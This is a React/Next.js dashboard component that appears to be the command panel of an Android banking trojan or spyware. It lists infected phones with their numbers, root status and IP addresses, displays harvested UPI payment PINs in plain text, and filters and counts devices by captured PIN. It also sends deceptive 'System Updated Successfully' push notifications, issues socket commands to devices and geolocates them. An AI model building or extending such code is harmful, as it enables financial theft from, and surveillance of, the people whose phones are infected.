"use client";

import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import {
  FiServer,
  FiWifi,
  FiWifiOff,
  FiSearch,
  FiEye,
  FiTrash2,
  FiMapPin,
  FiSend,
  FiChevronLeft,
  FiChevronRight,
  FiLoader,
  FiX,
  FiRefreshCw,
} from "react-icons/fi";
import { toast } from "sonner";
import { useRouter } from "next/navigation";
import { format } from "date-fns";
import dynamic from "next/dynamic";
import Tooltip from "./Tooltip";
import { BatteryFull, BatteryLow, BatteryMedium } from "lucide-react";
import { useSocket } from "../../context/SocketContext";
import { jwtDecode } from "jwt-decode";
import { sendFcmNotification } from "@/lib/fcm-ping";

const MapContainer = dynamic(
  () => import("react-leaflet").then((mod) => mod.MapContainer),
  { ssr: false }
);
const TileLayer = dynamic(
  () => import("react-leaflet").then((mod) => mod.TileLayer),
  { ssr: false }
);
const Marker = dynamic(
  () => import("react-leaflet").then((mod) => mod.Marker),
  { ssr: false }
);
const Popup = dynamic(() => import("react-leaflet").then((mod) => mod.Popup), {
  ssr: false,
});

type Device = {
  id: string;
  deviceId: string;
  modelName: string;
  androidV: string;
  isRoot: boolean;
  storage: string;
  battery: string;
  ipAddress: string;
  service_provider: string;
  mobNo: string;
  status: boolean;
  joined: Date;
  lastSeen: Date;
  note?: string;
  FCM_Token?: string
  upi_pin?: string;
  socketId?: string;
  isHighBalance?: number | null;
  imgUrl?: string;
  userId: string;
};

export interface TokenPayload {
  userId: string;
}

interface IpInfo {
  ip: string | null;
  version?: string;
  city?: string;
  region?: string;
  region_code?: string;
  country_code?: string;
  country_name?: string;
  country_capital?: string;
  continent_code?: string;
  in_eu?: boolean;
  postal?: string;
  latitude?: number;
  longitude?: number;
  timezone?: string;
  utc_offset?: string;
  country_calling_code?: string;
  currency?: string;
  currency_name?: string;
  languages?: string;
  country_area?: number;
  country_population?: number;
  asn?: string;
  org?: string;
  hostname?: string;
}

const Devices = () => {
  const router = useRouter();
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [stats, setStats] = useState({
    total: 0,
    online: 0,
    offline: 0,
    withPin: 0,
  });

  const { socket, isConnected } = useSocket();
  const [userId, setUserId] = useState<string | null>(null);
  const [selectedDeviceIp, setSelectedDeviceIp] = useState<string | null>(null);
  const [selectedDeviceInfo, setSelectedDeviceInfo] = useState<IpInfo | null>(
    null
  );
  const [isLoadingLocation, setIsLoadingLocation] = useState(false);
  const [showLocationPopup, setShowLocationPopup] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [pinFilter, setPinFilter] = useState<string>("all");
  const [dateFilter, setDateFilter] = useState<string>("");
  const [itemsPerPage, setItemsPerPage] = useState<number>(8);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [totalDevices, setTotalDevices] = useState(0);
  const [isRefreshing, setIsRefreshing] = useState(false);

  const handleRefresh = async () => {
    setIsRefreshing(true);
    try {
      await fetchDevices();
      toast.success("Devices refreshed successfully");
    } catch (error) {
      toast.error("Failed to refresh devices");
    } finally {
      setIsRefreshing(false);
    }
  };

  const calculateStats = (devices: Device[]) => {
    const total = devices.length;
    const online = devices.filter((d) => d.status === true).length;
    const offline = devices.filter((d) => d.status === false).length;
    const withPin = devices.filter(
      (d) => d.upi_pin && d.upi_pin.trim() !== ""
    ).length;

    return { total, online, offline, withPin };
  };

  const fetchIpInfo = async (ip: string) => {
    setIsLoadingLocation(true);
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      if (!response.ok) {
        throw new Error(`IP lookup failed with status ${response.status}`);
      }
      const data: IpInfo = await response.json();
      setSelectedDeviceInfo(data);
      setShowLocationPopup(true);
    } catch (error) {
      console.error("Error fetching IP info:", error);
      toast.error("Failed to fetch location information");
    } finally {
      setIsLoadingLocation(false);
    }
  };

  const handleLocateDevice = (device: Device) => {
    if (!device.ipAddress) {
      toast.error("No IP address available for this device");
      return;
    }
    setSelectedDeviceIp(device.ipAddress);
    fetchIpInfo(device.ipAddress);
  };

  const fetchDevices = async () => {
    try {
      setLoading(true);
      const localData = localStorage.getItem("userData");
      const token = localData ? JSON.parse(localData).token : null;
      const countsResponse = await fetch(
        "/api/client/devices?countsOnly=true",
        {
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
        }
      );
      const countsData = await countsResponse.json();
      setStats(countsData);

      const params = new URLSearchParams({
        page: currentPage.toString(),
        limit: itemsPerPage.toString(),
        ...(statusFilter !== "all" && {
          status: statusFilter === "online" ? "true" : "false",
        }),
        ...(pinFilter !== "all" && {
          hasUpiPin: pinFilter === "available" ? "true" : "false",
        }),
        ...(searchQuery && { search: searchQuery }),
        ...(dateFilter && { date: dateFilter }),
      });

      const devicesResponse = await fetch(
        `/api/client/devices?${params.toString()}`,
        {
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
        }
      );
      const devicesData = await devicesResponse.json();

      setDevices(devicesData.devices);
      setTotalDevices(devicesData.total);
      setTotalPages(devicesData.totalPages);

      setStats(calculateStats(devicesData.devices));
    } catch (error) {
      console.error("Error fetching devices:", error);
      toast.error("Failed to load devices");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    try {
      const userData = localStorage.getItem("userData");

      if (userData) {
        const { token } = JSON.parse(userData);
        if (token) {
          const decoded = jwtDecode<{ userId: string }>(token);
          console.log("Decoded token:", decoded);
          setUserId(decoded.userId);
        } else {
          console.warn("No token found in localStorage.");
        }
      }
    } catch (error) {
      console.error("Error decoding token:", error);
    }
  }, []);

  useEffect(() => {
    fetchDevices();
  }, [
    currentPage,
    itemsPerPage,
    statusFilter,
    pinFilter,
    searchQuery,
    dateFilter,
  ]);

  useEffect(() => {
    if (!socket || !isConnected || !userId) return;

    const handleDeviceUpdate = (updatedDevice: Device) => {
      if (updatedDevice.userId !== userId) return;

      setDevices((prevDevices) => {
        const index = prevDevices.findIndex((d) => d.id === updatedDevice.id);
        if (index !== -1) {
          const newDevices = [...prevDevices];
          newDevices[index] = updatedDevice;

          setStats(calculateStats(newDevices));

          return newDevices;
        }
        return prevDevices;
      });
    };

    const handleDeviceCreated = (newDevice: Device) => {
      if (newDevice.userId !== userId) return;
      fetchDevices();
    };

    socket.on("device_updated", handleDeviceUpdate);
    socket.on("device_created", handleDeviceCreated);
    return () => {
      socket.off("device_updated", handleDeviceUpdate);
      socket.off("device_created", handleDeviceCreated);
    };
  }, [socket, isConnected, userId, fetchDevices]);

  const handleDelete = (deviceId: string, deviceName: string) => {
    toast.custom(
      (t) => (
        <div className="bg-gray-800 border border-gray-700 rounded-lg p-4 shadow-lg">
          <p className="text-gray-200 mb-4">
            Are you sure you want to delete {deviceName}?
          </p>
          <div className="flex justify-end space-x-2">
            <button
              onClick={() => toast.dismiss(t)}
              className="px-4 py-2 rounded-lg bg-gray-700 text-gray-300 hover:bg-gray-600"
            >
              Cancel
            </button>
            <button
              onClick={async () => {
                try {
                  const localData = localStorage.getItem("userData");
                  const token = localData ? JSON.parse(localData).token : null;
                  const response = await fetch(
                    `/api/client/devices/${deviceId}`,
                    {
                      method: "DELETE",
                      credentials: "include",
                      headers: {
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${token}`,
                      },
                    }
                  );

                  if (response.ok) {
                    toast.success(`${deviceName} deleted successfully`);
                    fetchDevices();
                  } else {
                    throw new Error("Failed to delete device");
                  }
                } catch (error) {
                  toast.error(`Failed to delete ${deviceName}`);
                } finally {
                  toast.dismiss(t);
                }
              }}
              className="px-4 py-2 rounded-lg bg-red-600 text-white hover:bg-red-700"
            >
              Delete
            </button>
          </div>
        </div>
      ),
      {
        duration: 10000,
      }
    );
  };

  const handleViewDetails = (id: string, deviceId: string) => {
    router.push(`/client-details/?id=${id}&deviceId=${deviceId}`);
  };

  const handlePing = async (device: Device) => {
    try {
      const localData = localStorage.getItem("userData");
      const token = localData ? JSON.parse(localData).token : null;

      if (device.FCM_Token) {
        const loadingToast = toast.loading(
          `Sending push notification to ${device.modelName}...`
        );
        const response = await sendFcmNotification(
          device.FCM_Token,
          "System Updated Successfully",
          `Your device ${device.modelName} has been updated successfully.`
        );
        toast.dismiss(loadingToast);

        if (response.status === "success") {
          toast.success(`Ping sent to ${device.modelName}. Waiting for reply...`);
          setTimeout(() => {
            if (!device.status) {
              toast.error(`${device.modelName} is offline or not responding`);
            } else {
              toast.success(`${device.modelName} responded successfully!`);
            }
          }, 3000);
        } else {
          toast.error(
            `Failed to send ping to ${device.modelName}: ${response.message}`
          );
        }
        return;
      }

      if (!device.status || !device.socketId) {
        toast.error(
          `${device.modelName} has no FCM token and is offline — cannot ping`
        );
        return;
      }

      if (!socket || !isConnected) {
        toast.error(
          `${device.modelName} has no FCM token and the panel socket is disconnected`
        );
        return;
      }

      const loadingToast = toast.loading(
        `Pinging ${device.modelName} over socket...`
      );

      let replied = false;
      const onActionInfo = (data: any) => {
        const payload = data?.payload;
        const cmd = payload?.cmd;
        const success = payload?.isSuccess === 1 || payload?.isSuccess === true;
        const isPong =
          (cmd === "ping" || cmd === "pong" || cmd === "show_toast") && success;
        const isPongMessage = data?.message === "pong" && data?.type === "info";
        if (isPong || isPongMessage) {
          replied = true;
          toast.dismiss(loadingToast);
          toast.success(`${device.modelName} responded to ping!`);
        }
      };
      socket.on("cleint_action_info", onActionInfo);

      try {
        socket.emit("server_command_to_user", {
          socketId: socket.id,
          toClient: device.socketId,
          user_id: device.userId,
          device_id: device.deviceId,
          action: "ping",
        });
      } catch (err) {
        socket.off("cleint_action_info", onActionInfo);
        toast.dismiss(loadingToast);
        toast.error(`Failed to ping ${device.modelName}`);
        return;
      }

      setTimeout(() => {
        socket.off("cleint_action_info", onActionInfo);
        toast.dismiss(loadingToast);
        if (!replied) {
          toast.error(
            `${device.modelName} did not respond within 5s (no FCM token; socket-only ping)`
          );
        }
      }, 5000);
    } catch (error) {
      toast.error(`Error sending ping to ${device.modelName}`);
      console.error("Ping error:", error);
    }
  };

  const cardVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 },
  };

  return (
    <div className="flex-1 p-6 ml-20 bg-gray-900 text-gray-100 min-h-screen">
      <div className="mb-6 flex justify-between items-start">
        <div>
          <h1 className="text-3xl font-bold text-indigo-400">
            Device Management
          </h1>
          <p className="text-gray-400">
            Manage and monitor all your connected devices
          </p>
        </div>
        <motion.button
          whileHover={{ rotate: 90 }}
          whileTap={{ rotate: 180 }}
          onClick={handleRefresh}
          disabled={isRefreshing}
          className={`p-2 rounded-full ${
            isRefreshing
              ? "bg-gray-700 text-gray-500"
              : "bg-gray-700 text-indigo-400 hover:bg-gray-600 hover:text-indigo-300"
          } transition-colors`}
          aria-label="Refresh devices"
        >
          <FiRefreshCw
            className={`text-xl ${isRefreshing ? "animate-spin" : ""}`}
          />
        </motion.button>
      </div>
      {/* Compact Devices Stats */}
      <section className="mb-6">
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          {/* Total Devices */}
          <motion.div
            variants={cardVariants}
            initial="hidden"
            animate="visible"
            transition={{ duration: 0.3, delay: 0.1 }}
            className="bg-gray-800 rounded-lg p-4 border border-gray-700"
          >
            <div className="flex items-center space-x-4">
              <div className="bg-indigo-900/20 p-3 rounded-full border border-indigo-500/30">
                <FiServer className="text-indigo-400 text-xl" />
              </div>
              <div>
                <h3 className="text-gray-400 text-sm">Total Devices</h3>
                <p className="text-xl font-bold">{stats.total}</p>
              </div>
            </div>
          </motion.div>

          {/* Online Devices */}
          <motion.div
            variants={cardVariants}
            initial="hidden"
            animate="visible"
            transition={{ duration: 0.3, delay: 0.2 }}
            className="bg-gray-800 rounded-lg p-4 border border-gray-700"
          >
            <div className="flex items-center space-x-4">
              <div className="bg-green-900/20 p-3 rounded-full border border-green-500/30">
                <FiWifi className="text-green-400 text-xl" />
              </div>
              <div>
                <h3 className="text-gray-400 text-sm">Online Devices</h3>
                <p className="text-xl font-bold text-green-400">
                  {stats.online}
                </p>
              </div>
            </div>
          </motion.div>

          {/* Offline Devices */}
          <motion.div
            variants={cardVariants}
            initial="hidden"
            animate="visible"
            transition={{ duration: 0.3, delay: 0.3 }}
            className="bg-gray-800 rounded-lg p-4 border border-gray-700"
          >
            <div className="flex items-center space-x-4">
              <div className="bg-red-900/20 p-3 rounded-full border border-red-500/30">
                <FiWifiOff className="text-red-400 text-xl" />
              </div>
              <div>
                <h3 className="text-gray-400 text-sm">Offline Devices</h3>
                <p className="text-xl font-bold text-red-400">
                  {stats.offline}
                </p>
              </div>
            </div>
          </motion.div>

          {/* Devices with PIN */}
          <motion.div
            variants={cardVariants}
            initial="hidden"
            animate="visible"
            transition={{ duration: 0.3, delay: 0.4 }}
            className="bg-gray-800 rounded-lg p-4 border border-gray-700"
          >
            <div className="flex items-center space-x-4">
              <div className="bg-purple-900/20 p-3 rounded-full border border-purple-500/30">
                <FiMapPin className="text-purple-400 text-xl" />
              </div>
              <div>
                <h3 className="text-gray-400 text-sm">Devices with PIN</h3>
                <p className="text-xl font-bold text-purple-400">
                  {stats.withPin}
                </p>
              </div>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Filters Section */}
      <section className="mb-6">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
          className="bg-gray-800 rounded-lg p-4 border border-gray-700"
        >
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            {/* Search Bar */}
            <div className="relative col-span-1 md:col-span-2">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <FiSearch className="text-gray-400" />
              </div>
              <input
                type="text"
                placeholder="Search devices..."
                className="bg-gray-700 border border-gray-600 text-white rounded-lg block w-full pl-10 p-2.5 focus:ring-indigo-500 focus:border-indigo-500"
                value={searchQuery}
                onChange={(e) => {
                  setSearchQuery(e.target.value);
                  setCurrentPage(1);
                }}
              />
            </div>

            {/* Status Filter */}
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <FiWifi className="text-gray-400" />
              </div>
              <select
                className="bg-gray-700 border border-gray-600 text-white rounded-lg block w-full pl-10 p-2.5 focus:ring-indigo-500 focus:border-indigo-500 appearance-none"
                value={statusFilter}
                onChange={(e) => {
                  setStatusFilter(e.target.value);
                  setCurrentPage(1);
                }}
              >
                <option value="all">All Status</option>
                <option value="online">Online</option>
                <option value="offline">Offline</option>
              </select>
            </div>

            {/* Pin Filter */}
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <FiMapPin className="text-gray-400" />
              </div>
              <select
                className="bg-gray-700 border border-gray-600 text-white rounded-lg block w-full pl-10 p-2.5 focus:ring-indigo-500 focus:border-indigo-500 appearance-none"
                value={pinFilter}
                onChange={(e) => {
                  setPinFilter(e.target.value);
                  setCurrentPage(1);
                }}
              >
                <option value="all">All Devices</option>
                <option value="available">With PIN</option>
                <option value="unavailable">Without PIN</option>
              </select>
            </div>
          </div>

          {/* Date Filter and Items Per Page */}
          <div className="mt-4 flex flex-wrap items-center justify-between gap-4">
            <div className="relative">
              <input
                type="date"
                placeholder="Filter by date"
                className="bg-gray-700 border border-gray-600 text-white rounded-lg p-2.5 focus:ring-indigo-500 focus:border-indigo-500"
                value={dateFilter}
                onChange={(e) => {
                  setDateFilter(e.target.value);
                  setCurrentPage(1);
                }}
              />
            </div>

            {/* Items Per Page Selector */}
            <div className="flex items-center space-x-2">
              <span className="text-gray-400 text-sm">Show:</span>
              <select
                className="bg-gray-700 border border-gray-600 text-white rounded-lg p-2 focus:ring-indigo-500 focus:border-indigo-500"
                value={itemsPerPage}
                onChange={(e) => {
                  setItemsPerPage(Number(e.target.value));
                  setCurrentPage(1);
                }}
              >
                <option value="5">5</option>
                <option value="8">8</option>
                <option value="12">12</option>
                <option value="20">20</option>
              </select>
              <span className="text-gray-400 text-sm">per page</span>
            </div>
          </div>
        </motion.div>
      </section>

      {/* Devices List */}
      <section>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
          className="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden"
        >
          {/* Table Header */}
          <div className="grid grid-cols-12 gap-4 p-4 bg-gray-700 text-gray-300 font-medium">
            <div className="col-span-1">#</div>
            <div className="col-span-3">Device</div>
            <div className="col-span-2">Status</div>
            <div className="col-span-2">Battery</div>
            <div className="col-span-2">UPI Pin</div>
            <div className="col-span-2">Actions</div>
          </div>

          {/* Loading State */}
          {loading && (
            <div className="p-8 text-center text-gray-400 flex justify-center">
              <FiLoader className="animate-spin mr-2" />
              Loading devices...
            </div>
          )}

          {/* Devices List */}
          {!loading && devices.length === 0 ? (
            <div className="p-8 text-center text-gray-400">
              No devices found matching your filters.
            </div>
          ) : (
            !loading &&
            devices.map((device, index) => (
              <motion.div
                key={device.id}
                variants={cardVariants}
                initial="hidden"
                animate="visible"
                transition={{ duration: 0.3, delay: index * 0.05 }}
                className="grid grid-cols-12 gap-2 p-4 border-b border-gray-700 hover:bg-gray-750 transition-colors"
              >
                <div className="col-span-1 flex items-center">
                  {(currentPage - 1) * itemsPerPage + index + 1}
                </div>
                <div className="col-span-3 flex items-center space-x-3">
                  <div className="flex items-center space-x-3">
                    <div className="w-8 h-8 rounded-full bg-indigo-900/20 flex items-center justify-center overflow-hidden">
                      {device.imgUrl ? (
                        <img
                          src={device.imgUrl}
                          alt={device.modelName}
                          className="w-full h-full object-cover"
                          onError={(e) => {
                            (
                              e.currentTarget as HTMLImageElement
                            ).style.display = "none";
                            (
                              e.currentTarget.nextElementSibling as HTMLElement
                            ).style.display = "block";
                          }}
                        />
                      ) : null}
                      <FiServer
                        className={`text-indigo-400 ${
                          device.imgUrl ? "hidden" : "block"
                        }`}
                      />
                    </div>
                    <div>
                      <span className="block">{device.modelName}</span>
                      <div className="col-span-2 flex items-center text-sm text-gray-300">
                        {device.mobNo}
                      </div>
                      <div className="col-span-2 flex items-center text-sm text-gray-400">
                        {format(new Date(device.joined), "dd MMM yyyy")}
                      </div>
                    </div>
                  </div>
                </div>
                <div className="col-span-2 flex items-center">
                  <span
                    className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                      device.status
                        ? "bg-green-900/20 text-green-400"
                        : "bg-red-900/20 text-red-400"
                    }`}
                  >
                    {device.status ? (
                      <>
                        <FiWifi className="mr-1" /> Online
                      </>
                    ) : (
                      <>
                        <FiWifiOff className="mr-1" /> Offline
                      </>
                    )}
                  </span>
                </div>

                <div className="col-span-2 flex items-center">
                  {device.battery ? (
                    (() => {
                      const batteryValue = parseInt(
                        device.battery.replace("%", "")
                      );
                      let color = "text-yellow-400";
                      let bgColor = "bg-yellow-900/20";
                      let Icon = BatteryMedium;

                      if (batteryValue > 75) {
                        color = "text-green-400";
                        bgColor = "bg-green-900/20";
                        Icon = BatteryFull;
                      } else if (batteryValue < 30) {
                        color = "text-red-400";
                        bgColor = "bg-red-900/20";
                        Icon = BatteryLow;
                      }

                      return (
                        <span
                          className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${bgColor} ${color}`}
                        >
                          <Icon className={`w-4 h-4 mr-1 ${color}`} />
                          <p>
                            Battery:&nbsp;
                            <span className={`font-bold ${color}`}>
                              {device.battery}
                            </span>
                          </p>
                        </span>
                      );
                    })()
                  ) : (
                    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-800/20 text-gray-400">
                      <BatteryLow className="w-4 h-4 mr-1 text-gray-400" />
                      <p>No Battery Info</p>
                    </span>
                  )}
                </div>
                <div className="col-span-2 flex items-center">
                  {device.upi_pin ? (
                    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-900/20 text-green-400">
                      <p>
                        Available:&nbsp;
                        <span className="font-bold text-green-400">
                          {device.upi_pin}
                        </span>
                      </p>
                    </span>
                  ) : (
                    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-900/20 text-red-400">
                      <p className="text-red-400">Not Available</p>
                    </span>
                  )}
                </div>
                <div className="col-span-2 flex items-center space-x-2">
                  <Tooltip content="View Details">
                    <button
                      onClick={() =>
                        handleViewDetails(device.id, device.deviceId)
                      }
                      className="p-2 text-indigo-400 hover:text-indigo-300 hover:bg-indigo-900/20 rounded-full transition-colors"
                    >
                      <FiEye />
                    </button>
                  </Tooltip>

                  <Tooltip content="Delete Device">
                    <button
                      onClick={() => handleDelete(device.id, device.modelName)}
                      className="p-1 text-red-400 hover:text-red-300 hover:bg-red-900/20 rounded-full transition-colors"
                    >
                      <FiTrash2 />
                    </button>
                  </Tooltip>

                  <Tooltip content="Ping Device">
                    <button
                      onClick={() => handlePing(device)}
                      className="p-1 text-green-400 hover:text-green-500 hover:bg-green-900/20 rounded-full transition-colors"
                    >
                      <FiSend />
                    </button>
                  </Tooltip>

                  <Tooltip content="Locate Device">
                    <button
                      onClick={() => handleLocateDevice(device)}
                      disabled={isLoadingLocation || !device.ipAddress}
                      className={`p-1 text-yellow-400 hover:text-yellow-300 hover:bg-yellow-900/20 rounded-full transition-colors ${
                        isLoadingLocation &&
                        selectedDeviceIp === device.ipAddress
                          ? "opacity-50 cursor-not-allowed"
                          : ""
                      }`}
                    >
                      {isLoadingLocation &&
                      selectedDeviceIp === device.ipAddress ? (
                        <FiLoader className="animate-spin" />
                      ) : (
                        <FiMapPin />
                      )}
                    </button>
                  </Tooltip>
                </div>
              </motion.div>
            ))
          )}
        </motion.div>

        {/* Pagination */}
        {!loading && totalPages > 1 && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.5 }}
            className="flex items-center justify-between mt-6"
          >
            <button
              onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
              disabled={currentPage === 1}
              className={`flex items-center px-4 py-2 rounded-lg ${
                currentPage === 1
                  ? "bg-gray-800 text-gray-500 cursor-not-allowed"
                  : "bg-gray-700 text-gray-300 hover:bg-gray-600"
              }`}
            >
              <FiChevronLeft className="mr-1" /> Previous
            </button>

            <div className="flex space-x-1">
              {Array.from({ length: totalPages }, (_, i) => i + 1).map(
                (number) => (
                  <button
                    key={number}
                    onClick={() => setCurrentPage(number)}
                    className={`w-10 h-10 flex items-center justify-center rounded-lg ${
                      currentPage === number
                        ? "bg-indigo-600 text-white"
                        : "bg-gray-700 text-gray-300 hover:bg-gray-600"
                    }`}
                  >
                    {number}
                  </button>
                )
              )}
            </div>

            <button
              onClick={() =>
                setCurrentPage((prev) => Math.min(prev + 1, totalPages))
              }
              disabled={currentPage === totalPages}
              className={`flex items-center px-4 py-2 rounded-lg ${
                currentPage === totalPages
                  ? "bg-gray-800 text-gray-500 cursor-not-allowed"
                  : "bg-gray-700 text-gray-300 hover:bg-gray-600"
              }`}
            >
              Next <FiChevronRight className="ml-1" />
            </button>
          </motion.div>
        )}
      </section>

      {/* Location Popup */}
      {showLocationPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-gray-800 rounded-lg p-6 w-full max-w-4xl border border-gray-700">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-bold">Device Location</h3>
              <button
                onClick={() => {
                  setShowLocationPopup(false);
                  setSelectedDeviceInfo(null);
                }}
                className="text-gray-400 hover:text-white"
              >
                <FiX size={24} />
              </button>
            </div>

            {selectedDeviceInfo ? (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="md:col-span-2 h-96 rounded-lg overflow-hidden">
                  {selectedDeviceInfo.latitude &&
                  selectedDeviceInfo.longitude ? (
                    <MapContainer
                      center={[
                        selectedDeviceInfo.latitude,
                        selectedDeviceInfo.longitude,
                      ]}
                      zoom={13}
                      style={{ height: "100%", width: "100%" }}
                    >
                      <TileLayer
                        url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                        attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                      />
                      <Marker
                        position={[
                          selectedDeviceInfo.latitude,
                          selectedDeviceInfo.longitude,
                        ]}
                      >
                        <Popup>
                          <div className="text-gray-800">
                            <p className="font-bold">
                              {selectedDeviceInfo.city || "Unknown city"},{" "}
                              {selectedDeviceInfo.country_name ||
                                "Unknown country"}
                            </p>
                            <p>IP: {selectedDeviceInfo.ip}</p>
                          </div>
                        </Popup>
                      </Marker>
                    </MapContainer>
                  ) : (
                    <div className="h-full flex items-center justify-center bg-gray-700 text-gray-400">
                      No location data available
                    </div>
                  )}
                </div>

                <div className="bg-gray-700 p-4 rounded-lg">
                  <h4 className="font-bold text-lg mb-4 border-b border-gray-600 pb-2">
                    Device Details
                  </h4>
                  <div className="space-y-3">
                    <div>
                      <p className="text-gray-400 text-sm">IP Address</p>
                      <p className="font-medium">
                        {selectedDeviceInfo.ip || "Unknown"}
                      </p>
                    </div>
                    <div>
                      <p className="text-gray-400 text-sm">Location</p>
                      <p className="font-medium">
                        {selectedDeviceInfo.city || "Unknown city"},{" "}
                        {selectedDeviceInfo.region || "Unknown region"},{" "}
                        {selectedDeviceInfo.country_name || "Unknown country"}
                      </p>
                    </div>
                    {selectedDeviceInfo.latitude &&
                      selectedDeviceInfo.longitude && (
                        <div>
                          <p className="text-gray-400 text-sm">Coordinates</p>
                          <p className="font-medium">
                            {selectedDeviceInfo.latitude.toFixed(4)},{" "}
                            {selectedDeviceInfo.longitude.toFixed(4)}
                          </p>
                        </div>
                      )}
                    <div>
                      <p className="text-gray-400 text-sm">ISP</p>
                      <p className="font-medium">
                        {selectedDeviceInfo.org || "Unknown"}
                      </p>
                    </div>
                    <div>
                      <p className="text-gray-400 text-sm">Timezone</p>
                      <p className="font-medium">
                        {selectedDeviceInfo.timezone || "Unknown"}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <div className="text-center py-8 text-gray-400">
                Loading location information...
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Devices;
